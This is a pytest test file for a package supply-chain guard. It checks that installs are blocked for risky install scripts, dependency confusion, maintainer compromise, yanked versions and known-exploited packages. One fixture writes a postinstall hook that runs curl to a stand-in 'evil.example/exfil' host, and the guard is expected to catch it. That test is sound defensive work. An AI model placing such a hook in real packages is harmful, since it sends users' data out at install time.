"""Phase 04 install-time evaluator reason proofs (SCSR066-SCSR070)."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from codex_plugin_scanner.guard.runtime.supply_chain_bundle import (
    evaluate_cached_supply_chain_bundle,
    load_supply_chain_bundle_response,
)
from codex_plugin_scanner.guard.runtime.supply_chain_package_eval import evaluate_package_request_artifact
from codex_plugin_scanner.guard.store import GuardStore
from tests.guard_python_phase12_support import (
    WORKSPACE_ID as PYTHON_WORKSPACE_ID,
    artifact_from_command_fixture,
    bundle_response_fixture,
    package_fixture,
)
from tests.test_guard_js_supply_chain_phase11 import WORKSPACE_ID, _artifact_from_command, _bundle_response, _write_text
from tests.test_guard_supply_chain_bundle import _bundle_dict, _generate_key_pair, _sign_bundle_response


def test_install_lifecycle_script_risk_blocks_local_package(tmp_path: Path) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    _write_text(
        workspace_dir / "fixtures" / "evil-package" / "package.json",
        '{"name":"evil-package","scripts":{"postinstall":"curl http://evil.example/exfil"}}\n',
    )
    store = GuardStore(home_dir)

    artifact = _artifact_from_command("npm install ./fixtures/evil-package", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["reasons"][0]["code"] == "install_script_risk"


def test_dependency_confusion_policy_blocks_reserved_internal_name(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    _write_text(workspace_dir / "package.json", '{"name":"demo"}\n')
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        _bundle_response(
            packages=[],
            policy_rules=[
                {
                    "action": "block",
                    "ruleId": "reserve-internal-tool",
                    "ecosystemSelector": "npm",
                    "enabled": True,
                    "expiresAt": None,
                    "harnessSelector": None,
                    "packageSelector": "@hashgraph/internal-tool",
                    "priority": 1,
                    "severityThreshold": None,
                    "versionRangeSelector": None,
                }
            ],
        ),
        "2026-05-19T00:00:00Z",
    )

    artifact = _artifact_from_command("npm install internal-tool@1.0.0", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.packages[0]["reasons"][0]["code"] == "dependency_confusion_risk"


def test_maintainer_compromise_reason_blocks_high_risk_package(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        WORKSPACE_ID,
        _bundle_response(
            packages=[
                {
                    "confidence": 990,
                    "defaultAction": "block",
                    "ecosystem": "npm",
                    "exploitLevel": "elevated",
                    "knownExploited": False,
                    "malwareState": "suspected",
                    "name": "trusted-build-tools",
                    "normalizedSeverity": "high",
                    "packageAgeState": "watch",
                    "purl": "pkg:npm/trusted-build-tools@5.4.0",
                    "reachability": "reachable",
                    "recommendedFixVersion": None,
                    "relatedAdvisoryIds": ["GHSA-maintainer-risk"],
                    "riskScore": 930,
                    "sourceIntegrityState": "high-risk",
                    "version": "5.4.0",
                }
            ]
        ),
        "2026-05-19T00:00:00Z",
    )

    artifact = _artifact_from_command("npm install trusted-build-tools@5.4.0", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert any(reason["code"] == "maintainer_compromise" for reason in result.reasons)


def test_yanked_release_blocks_requested_python_version_with_safer_fix_copy(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home_dir = tmp_path / "home"
    workspace_dir = tmp_path / "workspace"
    workspace_dir.mkdir()
    store = GuardStore(home_dir)
    monkeypatch.setattr(store, "get_cloud_workspace_id", lambda: PYTHON_WORKSPACE_ID)
    store.cache_supply_chain_bundle(
        PYTHON_WORKSPACE_ID,
        bundle_response_fixture(
            packages=[
                package_fixture(
                    name="urllib3",
                    version="2.0.0",
                    default_action="block",
                    recommended_fix_version="2.0.7",
                )
            ]
        ),
        "2026-05-19T00:00:00Z",
    )

    artifact = artifact_from_command_fixture("pip install urllib3==2.0.0", workspace=workspace_dir)
    result = evaluate_package_request_artifact(artifact=artifact, store=store, workspace_dir=workspace_dir)

    assert result.decision == "block"
    assert result.user_copy.next_step == "pip install urllib3==2.0.7"
    assert "pip install urllib3==2.0.7" in result.user_copy.harness_message


def test_kev_escalation_blocks_known_exploited_bundle_package() -> None:
    private_key, _public_key = _generate_key_pair()
    blocking_response = load_supply_chain_bundle_response(
        json.dumps(_sign_bundle_response(_bundle_dict(), private_key_pem=private_key))
    )
    blocking_decision = evaluate_cached_supply_chain_bundle(
        blocking_response,
        package_name="minimist",
        package_version="1.2.8",
        now=blocking_response.bundle.generated_at_timestamp + 60,
    )

    assert blocking_decision.action == "block"
    assert blocking_decision.reason == "known_malware_or_kev"
